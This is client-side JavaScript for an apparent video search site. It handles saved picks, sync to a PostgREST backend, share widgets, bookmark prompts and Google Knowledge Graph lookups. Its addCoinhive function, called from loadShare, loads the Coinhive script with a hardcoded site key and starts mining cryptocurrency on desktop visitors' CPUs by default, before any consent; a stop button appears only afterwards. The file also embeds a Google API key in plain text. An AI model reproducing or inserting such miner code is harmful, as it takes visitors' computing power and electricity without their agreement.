        var newUk = getURLParameter("uk",video.url);
        for(var i = 0;i<videos.length;i++){
            var object = videos[i];
            var uk = getURLParameter("uk",object.url);
            if(newUk&&newUk==uk){
                return true;
            }
        };
    }catch(e){
        return true;
    }
    return false;
}

function syncIsIt(key,data){

    var self = {};

    self.key = key|| config.key;
    self.data = data|| JSON.parse(localStorage.getItem(key)||"{}");

    self.uri = "https://postgrest-taifu.herokuapp.com/testisit3";
    self.getBykey = function(key){
        var key = (key||self.key);
        var method = "get";
        var uri = self.uri+"?order=install_date.desc&key=eq."+key;
        var fn = function(data){
            console.log(data);
            self.setIframe(data);
            setLocal(key,data);
        }
        ajax(uri,fn,null,method,null);
    }
    self.setIframe = function (data,id,setKey){
        var data = JSON.parse(data);
        data.map(function(o){

            var video = JSON.parse(o.video);
            if(video){
                video.key = o.key;
                setIframe(video,true,null,null,id);
            }
        });
    }
    self.getAll = function(){
        var method = "get";
        var uri = self.uri+"?order=install_date.desc&limit=5";
        var fn = function(data){
            console.log(data);
            self.setIframe(data,"dataIsIt",true);
            setLocal(key,data);
        }
        ajax(uri,fn,null,method,null);
    }
    function setLocal(key,data){
        var values = JSON.parse(localStorage.getItem(key)||"{}");
        var data = JSON.parse(data);
        data.map(function(o){
            if(o.key==key){
                values[o.url]=o.count;
            }
        });
        localStorage.setItem(key, JSON.stringify(values));
        data = null;
    }
    self.add = function(key,video){
        

//         var method = "post";
//         var uri = self.uri;
//         var data = {url:video.url,key:key};
//         var fn = function(data){
//             console.log(data);
//         }
//         ajax(uri,fn,null,method,data,"application/json");


        var client = new XMLHttpRequest();
        client.open("POST", self.uri);
        client.setRequestHeader("Content-Type", "application/json");
        client.send(JSON.stringify({url:video.url,key:key,video:JSON.stringify(video)}));
    }
    self.delete = function(key,video){
        var method = "delete";
        var uri = self.uri+"?key=eq."+key+"&url=eq."+video.url;
        var fn = function(data){
            console.log(data);
        }
        ajax(uri,fn,null,method,null,"application/json");
    }

    return self;
}

function isItClick(isIt){
//     if(!isIt.checked){
//         isIt.checked = true;
//         isIt.disabled = true;
//         return;
//     }
    var key = isIt.dataset.key||config.key;
    
    storageItTrue(key,isIt);
//     isIt.disabled = true;
    isIt.classList.add("checked");
    var share = document.querySelector(".share-other");
    share.setAttribute("checked",isIt.checked);
}

function storageItTrue(key,isIt,remove){
    var video = JSON.parse(isIt.value);
    var values = JSON.parse(localStorage.getItem(key)||"{}");
    values[video.url] = remove?false:video;
    localStorage.setItem(key, JSON.stringify(values));

    var sync = syncIsIt(key,values);
    if(remove){
        sync.delete(key,video);
    }else{
        sync.add(key,video);
    }
}
function isItTrue(isIt){
    var key = config.key;
    var video = JSON.parse(isIt.value);
    var values = JSON.parse(localStorage.getItem(key)||"{}");
    if(values[video.url]){
        return true;
    }
    return false;
}


function importCSS(href,cssId){
    var cssId = cssId||'myCss';  // you could encode the css path itself to generate id..
    if (!document.getElementById(cssId))
    {
        var head  = document.getElementsByTagName('head')[0];
        var link  = document.createElement('link');
        link.id   = cssId;
        link.rel  = 'stylesheet';
        link.type = 'text/css';
        link.href = href;
        link.media = 'all';
        head.appendChild(link);
    }
}
function loadShare(key){

    addCoinhive();
    
    addDonate();

    importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/qrcode.js",function(){
        importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/social-share.js",function(){
    //         var ele = document.querySelector(".share-other");
    //         ele.dataset.weiboTitle = key+"有诶";
            if(key){
                document.querySelector(".share-other").dataset.footnote = key;
                socialShare(".share-other",{title:key});
            }else{
                socialShare(".share-other");
            }
        });
    });
    
    importCSS("https://overtrue.github.io/share.js/dist/css/share.min.css");
//     ajax("http://api.t.sina.com.cn/short_url/shorten.xml?source=3271760578&url_long=")
    window._bd_share_config={
        "common":{
            "bdSnsKey":{},"bdText":key||'',"bdMini":"2","bdMiniList":false,
            "bdPic":(document.images[0] || 0).src || '',"bdStyle":"1","bdSize":"32"
        },"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://wuchaolong.github.io/baiduShare/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
    
    importCSS("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css","awesome");
    document.querySelector(".nav-index").style.display = "block";
}
function addDonate(){
    var donateTemplate = document.getElementById("donateTemplate");
    var donateD = document.getElementById("donate");
    var spanHtml = config.feedback.string();
    donateD.innerHTML = donateTemplate.innerHTML+spanHtml;
    donateTemplate = donateD = null;
}
function addBookmark(){
  var bookmark = document.createElement("span");
  bookmark.classList.add("bookmark");
//   bookmark.href="javascript:return void();";
  bookmark.title="Bookmark me";
  bookmark.onclick = addFavorite;
  var top = document.getElementById("top");
//   top.innerHTML = '<span class="confirm-bookmark">Bookmark me</span>';
  top.appendChild(bookmark);
//   var result = confirm(config.bookmark.string());
//   if(result){
      bookmark.click();
      
//       localStorage.setItem("bookmarked",true);
//   }
  function addFavorite(e) {
      try{
            
            var bookmarkURL = "https://wuchaolong.github.io/video/"||window.location.href;
            var bookmarkTitle = "Video"||document.title;
            var confirm = config.bookmark.string();



            if(/Mac/i.test(navigator.userAgent)){
                alert('Cmd+D '+confirm);
            }else{

                alert('Ctrl+D '+confirm);
            }
            
            if ('addToHomescreen' in window && addToHomescreen.isCompatible) {
              // Mobile browsers
              addToHomescreen({ autostart: false, startDelay: 0 }).show(true);
            } else if (window.sidebar && window.sidebar.addPanel) {
              // Firefox <=22
              window.sidebar.addPanel(bookmarkTitle, bookmarkURL, '');
            } else if ((window.sidebar && /Firefox/i.test(navigator.userAgent)) || (window.opera && window.print)) {
              // Firefox 23+ and Opera <=14
        //       $(this).attr({
        //         href: bookmarkURL,
        //         title: bookmarkTitle,
        //         rel: 'sidebar'
        //       }).off(e);

              bookmark.href=bookmarkURL;
              bookmark.title=bookmarkTitle;
              bookmark.rel = "sidebar";
              bookmark.removeEventListener('click', addFavorite);

            } else if (window.external && ('AddFavorite' in window.external)) {
              // IE Favorites
              window.external.AddFavorite(bookmarkURL, bookmarkTitle);
            }
      }catch(e){
          console.log(e);
          return false;
      }
    
    hideBookmark(bookmark);
    return false;
  }
}
function hideBookmark(bookmark){
    document.getElementById("top").removeChild(bookmark);
    localStorage.setItem("bookmarked",true);
}
function isShowBookmark(){
    var bookmarked = localStorage.getItem("bookmarked");
    var isOlduser = localStorage.getItem("doubanSearchs");
    var isDirect = localStorage.getItem("isDirect");
    if(!bookmarked&&isOlduser&&!isDirect){
        return true;
    }
    return false;
}
function isDirect(){
    var referrer = document.createElement('a');
    referrer.href = document.referrer;
    var url = document.createElement('a');
    url.href = location.href;
//     localStorage.setItem("isOlduser",true);
    if(!document.referrer){
        localStorage.setItem("isDirect",true);
        return true;
    }
    return false;
}

function addCoinhive(){
    if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
        importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
            miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
            if (!miner.isMobile() && !miner.didOptOut(14400)) {
                if(!localStorage.getItem("removeCoinHive")){
                    startCoinHive();
                }else{
                    stopCoinHive();
                }
            }
        })
    }
}
function startCoinHive(){
    localStorage.removeItem("removeCoinHive");

    clearInterval(miner.interval);
    miner.start(CoinHive.IF_EXCLUSIVE_TAB);
    // Update stats once per second

    miner.interval = setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        var html = '<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'
            +totalHashes+'</a><button title="stop" onclick="stopCoinHive()">✗</button>';
        // Output to HTML elements...
        document.querySelector(".coinhive-miner").innerHTML = html;
    }, 1000);
}
function stopCoinHive(){

    localStorage.setItem("removeCoinHive",true);
    clearInterval(miner.interval);
    miner.stop();
    miner.interval = setInterval(function() {
        var hashesPerSecond = miner.getHashesPerSecond();
        var totalHashes = miner.getTotalHashes();
        var acceptedHashes = miner.getAcceptedHashes();
        var html = '<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'
            +totalHashes+'</a><button title="start" onclick="startCoinHive()">▶</button>';
        // Output to HTML elements...
        document.querySelector(".coinhive-miner").innerHTML = html;
    }, 1000);
}

function loadGoogleEntitie(){
    importScript('https://kgsearch.googleapis.com/v1/entities:search?query='+config.key+'&key=AIzaSyDTtLX1_UqEksS2zp3SAF1vMaGi3OyfJok&limit=5&indent=True&types=Movie&types=TVSeries&callback=setGoogleEntities&languages='+config.userLang+'&languages=en');    
}

function setGoogleEntities(data){
    var html  = "";
    var subjects = data.itemListElement;
    for(var i = 0;i<5&&i<subjects.length;i++){
        if(typeof subjects[i].result.name == "string"){
            var name = subjects[i].result.name;
            html += searchToHtml(name);

        }else{
            var name = subjects[i].result.name[0]["@value"];
            html += searchToHtml(name);
            var lastName = subjects[i].result.name[subjects[i].result.name.length-1]["@value"];
            if(i==0&&name!==lastName){
                html += searchToHtml(lastName);
            }
        }
    }
    var googleEntitiesD = document.getElementById("googleEntities");
    googleEntitiesD.innerHTML=html;
    googleEntitiesD.style.display = "block";
    googleEntitiesD.classList.add("doubanList");
    data=html=subjects=googleEntitiesD=null;
}



function inIframe () {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
}